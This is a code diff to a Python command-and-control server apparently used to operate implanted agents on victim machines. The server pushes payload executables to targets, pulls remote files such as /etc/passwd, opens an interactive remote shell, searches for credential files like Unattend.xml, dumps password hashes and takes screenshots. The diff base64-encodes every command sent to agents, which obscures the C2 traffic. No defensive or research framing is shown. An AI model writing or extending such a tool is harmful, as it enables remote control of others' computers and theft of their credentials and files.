@@ -1,3 +1,4 @@
+import base64
 import socket, threading, ssl
 import secrets, os, platform, json
 from agent import Agent
@@ -80,7 +81,7 @@ class Server:
             },
             'upload': {
                 'function': self.upload,
-                'description': 'Upload a file to selected target | LOCAL_FILE: String   REMOTE_DEST: String | upload payload.exe /tmp/payload.exe'
+                'description': 'Upload a file to selected target | FILE: String | upload payload.exe ./payloads/another_payload.exe'
             },
             'search': {
                 'function': self.search,
@@ -191,13 +192,13 @@ class Server:
 
         client_beat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        # self.debug_print(f"Try to connect to {agent.ip}:{agent.listening_beat_port}")
+        self.debug_print(f"Try to connect to {agent.ip}:{agent.listening_beat_port}")
         client_beat_socket.connect((agent.ip, agent.listening_beat_port))
-        # self.debug_print("Beat socket connected")
+        self.debug_print("Beat socket connected")
         id_to_send = agent.id.to_bytes(4, byteorder='big')
-        # self.debug_print(f"ID to send :: {id_to_send}")
+        self.debug_print(f"ID to send :: {id_to_send}")
         client_beat_socket.sendall(id_to_send)
-        # self.debug_print("Beat ID sent")
+        self.debug_print("Beat ID sent")
 
     def handle_client(self, client_socket):
         self.debug_print("HANDLE CLIENT", True)
@@ -397,6 +398,12 @@ class Server:
                 message = f"[+] {message}"
             print(message)
 
+    def base64_sending_data(self, sock, data):
+        """Send data in base64 format"""
+        data = base64.b64encode(data)
+        self.debug_print(f"Data encoded in base64 :: {data} - {len(data)} bytes")
+        sock.sendall(data)
+
     ####################################################################################################################
     ########################################### AGENT MANAGEMENT #######################################################
     ####################################################################################################################
@@ -544,29 +551,33 @@ class Server:
 
     def download(self, args):
         self.debug_print("DOWNLOAD", True)
-        args = list(filter(lambda x: x != "", args.split(" ")))
-        if len(args) < 1:
+        args_list = list(filter(lambda x: x != "", args.split(" ")))
+        if len(args_list) < 1:
             print("Please select at least one remote file to download\n\tEx: download /etc/passwd")
             return
-        self.current_agent.sock.sendall(f"upload {args}".encode())
+        self.debug_print(f"Try to download the files :: {args}")
+        self.base64_sending_data(self.current_agent.sock, f"upload {args}".encode())
         self.debug_print("Ask for the agent to upload")
-        for file_path in args:
+        for file_path in args_list:
+            self.debug_print(f"Get {file_path}")
             self.get_file_without_path(file_path)
 
     def upload(self, args):
         self.debug_print("UPLOAD", True)
-        args = list(filter(lambda x: x != "", args.split(" ")))
-        if len(args) < 2:
-            print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
+        args_list = list(filter(lambda x: x != "", args.split(" ")))
+        if len(args_list) < 1:
+            print("Please select a local file path and a remote path\n\tEx: upload payload.exe ./payloads/another_payload.exe")
             return
-        self.current_agent.sock.sendall(f"download {args[1]}".encode())
+        self.debug_print(f"Try to upload the files :: {args}")
+        self.base64_sending_data(self.current_agent.sock, f"download {args}".encode())
         self.debug_print("Ask for the agent to download")
-        self.send_file(args[0])
+        for file in args_list:
+            self.send_file(file)
 
     def shell(self, args=None):
         """ Enter in shell mode. The commands are sent to the agent and the output is displayed """
         self.debug_print("SHELL", True)
-        self.current_agent.sock.sendall("shell".encode())
+        self.base64_sending_data(self.current_agent.sock, "shell".encode())
         session = PromptSession()
         while True:
             command = session.prompt('$> ').strip()
@@ -574,10 +585,10 @@ class Server:
                 continue
             if command.lower() == 'exit':
                 self.debug_print("Tell the agent to exit this mode")
-                self.current_agent.sock.sendall("exit".encode())
+                self.base64_sending_data(self.current_agent.sock, "exit".encode())
                 self.debug_print("Exiting the shell mode")
                 break
-            self.current_agent.sock.sendall(command.encode())
+            self.base64_sending_data(self.current_agent.sock, command.encode())
             self.debug_print("Command sent")
             print(self.current_agent.sock.recv(8192).decode('latin1'))
             self.debug_print("Got the return of the command")
@@ -588,8 +599,8 @@ class Server:
         if len(args) < 2:
             print("Please specify a starting path and a file name\n\tEx: search C:\\ Unattend.xml")
             return
-        self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
-        self.debug_print("Search command sent")
+        self.base64_sending_data(self.current_agent.sock, f"search {args[0]} {args[1]}".encode())
+        print("Search command sent, please wait...")
         while True:
             data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
             self.debug_print(f"Got {len(data)} bytes")
@@ -625,14 +636,14 @@ class Server:
         for file in files:
             self.debug_print(f"{file}")
         # send the command to the agent
-        self.current_agent.sock.sendall("hashdump".encode())
+        self.base64_sending_data(self.current_agent.sock, "hashdump".encode())
         self.debug_print("hashdump command sent")
         for i in range(len(files)):
             self.get_file_without_path(files[i])
 
     def ipconfig(self, args=None):
         self.debug_print("IPCONFIG", True)
-        self.current_agent.sock.sendall("ipconfig".encode())
+        self.base64_sending_data(self.current_agent.sock, "ipconfig".encode())
         self.debug_print("ipconfig command sent")
         data = self.current_agent.sock.recv(16384)
         self.debug_print("Got the ipconfig")
@@ -640,7 +651,8 @@ class Server:
 
     def screenshot(self, args):
         self.debug_print("SCREENSHOT", True)
-        self.current_agent.sock.sendall("screenshot".encode())
+        self.base64_sending_data(self.current_agent.sock, "screenshot".encode())
+        # self.current_agent.sock.sendall("screenshot".encode())
         args = list(filter(lambda x: x != "", args.split(" ")))
         if len(args) >= 1:
             screen_path = f"{args[0]}.jpg"
